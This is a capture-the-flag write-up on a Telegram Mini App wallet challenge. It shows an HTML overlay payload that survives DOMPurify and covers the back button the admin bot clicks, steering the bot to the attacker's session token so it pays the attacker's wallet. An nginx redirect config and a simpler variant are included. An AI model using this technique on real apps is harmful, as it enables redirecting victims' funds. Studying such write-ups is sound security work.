# Tonyallet

- Category: Web / XSS
- Date: September 2024
- Difficulty: medium

## Description
We have a [Telegram Mini App](https://core.telegram.org/bots/webapps) hosted on `https://tonyallet-us.ctf.so` that has functionality to create posts and retrieve them. Posts can be reported from `https://tonyallet-us-report.ctf.so/` by submitting their ID which the admin bot visits later. Our objective is to exploit a XSS to replace the admin bot's displayed wallet address with ours so that it later sends funds to us instead of their address.

![mini app](assets/miniapp.png?raw=true "Telegram Mini App")

### Task
The [provided document](./assets/Tonyallet.pdf) explains that we need our wallet balance to increase in order to get the flag.

By inspecting network requests we can see that when the app fetches `https://tonyallet-us.ctf.so/wallet` with your authorization header, the JSON response looks like this:
```json
{
  "address": "0x82B560E978345544e2e161E4cB09b3fa4c846D65",
  "privateKey": "0xa322cb5832178f77abe8e5906733b062e3f2b43be21b1bfb7f1f7b8ca6fd068f",
  "balance": "0.0",
  "flag": "NO FLAG FOR U"
}
```

### Looking at the bot's code
Let's start backwards by immediately looking at the [provided selenium code](./code/bot.py) to understand precisely what the admin bot does after we report a post. The bot does not use telegram but instead visits `tonyallet-us.ctf.so` directly.

```py
wallet_address = selenium_obj.find_element(By.ID, "walletAddress").text
if not re.match(r"^0x[a-fA-F0-9]{40}$", wallet_address):
  return "Failed to get wallet address"
# send 0.1 ether to the wallet address
os.system(f"cast send --private-key {os.getenv('PRIVATE_KEY')} {wallet_address} --value 0.1ether --rpc-url {os.getenv('RPC_URL')}")
```

This code in the end is of interest because it is sending tokens to `wallet_address` which is obtained from the content of an HTML tag with id `walletAddress`. The HTML page in question is `selenium_obj.get(f"{host}/#tgWebAppData=" + open("tgWebApp.txt").read())` where host is `host = f"https://tonyallet-us.ctf.so"`.

### Looking at the mini app's source

Let's have a look at it's [source](./assets/index.html). The page contains a JavaScript function called [getWallet](./assets/index.html#L127) which is called when it loads.

```javascript
async function getWallet(bypass=false) {
  let localAddress = localStorage.getItem("walletAddress")
  if (localAddress && !bypass) {
    document.getElementById('walletAddress').textContent = localAddress;
    return
  }
	...
```

If we could execute custom JavaScript code on the admin's client-side to set the local storage of key `walletAddress` to ours it would be great but upon further investigation it did not appear to be possible to inject custom JavaScript code. Here it is important to note that localStorage keys are unique to each website. It is also important to note that selenium [starts with a fresh local storage](https://stackoverflow.com/questions/48841127/localstorage-in-selenium-webdriver) each time it runs.

Therefore, we could assume that the first time this page is opened by the bot the `localAddress` is null and so the function would continue executing this code:

```javascript
const response = await fetch(`/wallet`, {
  method: 'GET',
  headers: {
    'Authorization': tg.initData
  }
});
const data = await response.json();
document.getElementById('walletAddress').textContent = data.address;
localStorage.setItem("walletAddress", data.address);
```

`tg.initData` can be considered as a unique token for a telegram account and `https://tonyallet-us.ctf.so/wallet` uses it to send you your corresponding wallet address. By looking at the [bot's code](./code/bot.py#L41) and the [telegram script included in the HTML file](https://telegram.org/js/telegram-web-app.js) it appears that `tg.initData` can be controlled via a URL hashtag parameter called `tgWebAppData`. This means that if could get the bot to browse `https://tonyallet-us.ctf.so/#tgWebAppData=<our tg.initData token>`, then when the bot executes the above code it will receive our address and set it to it's localStorage.

## Exploit

The app is [vulnerable to XSS](./assets/index.html#L177) on `/` but only if you click retrieve post and the bot doesn't do this. Instead, the bot visits `/post?id=<our id>` which returns [this HTML](./assets/post.html). Since that page uses [DOMPurify.sanitize](./assets/post.html#L111) it is theoretically impossible to directly inject any JavaScript there. We are, however, free to put several HTML tags with any kind of CSS. Notice that the bot [clicks](./code/bot.py#L35) at coordinates `(screen width / 2, 10)` in order to hit the back button. Since our goal is to get the bot to browse `https://tonyallet-us.ctf.so/#tgWebAppData=<our tg.initData token>`, we could use this payload:

```html
<div style="position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; font-size: 20px; line-height: 1;">
<a href="https://tonyallet-us.ctf.so/#tgWebAppData=<our token>" style="display: block; margin-top: -10px;">
gogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogo
</a>
</div>
```

This covers the back button with our link that redirects to the URL we specify. [https://webhook.site/](https://webhook.site/) was useful for testing that the bot clicks on it.
![mini app](assets/posts.png?raw=true "Malicious vs normal post")

However, this did not work and you can see why by clicking on our malicious button locally (nothing happens). Since we are redirecting to a hashtag parameter on the same domain, the browser (tested on Firefox) does not reload the page because hashtag parameters are only relevant client-side. In order to trigger a reload, we must redirect to an external page we control which in turn redirects to `https://tonyallet-us.ctf.so/#tgWebAppData=<our tg.initData token>`. A service like [https://tinyurl.com/](https://tinyurl.com/) can likely be used but for this solution a private server with nginx was configured.

```
server {
  listen 443 ssl;
  server_name <redacted>;
	...

  location / {
    return 301 https://tonyallet-us.ctf.so/#tgWebAppData=query_id...;
  }
}
```

`href=` in the HTML payload was changed to point to the server using it's domain. In this way, our server tells browsers via 301 status code to redirect to the `tonyallet-us.ctf.so` URL with our token. It was required to URL encode the token.

After submitting the updated payload, our balance increases and we get the flag from `GET /wallet`.

```json
{
  "address": "0x82B560E978345544e2e161E4cB09b3fa4c846D65",
  "privateKey": "0xa322cb5832178f77abe8e5906733b062e3f2b43be21b1bfb7f1f7b8ca6fd068f",
  "balance": "0.1",
  "flag": "blaz{TGAPP_CAN_BE_HACKED_REALLY_BAD_:P}"
}
```

### A simpler alternative
Instead of setting up a redirection, it was possible to instead add any GET parameter to the URL. This would have been enough to cause a browser to reload the page. The `<a>` tag in the payload would have changed from this
```html
<a href="https://<our-controlled-server>" style="display: block; margin-top: -10px;">
```

to this
```html
<a href="https://tonyallet-us.ctf.so/?someparam=123#tgWebAppData=<our token>" style="display: block; margin-top: -10px;">
```
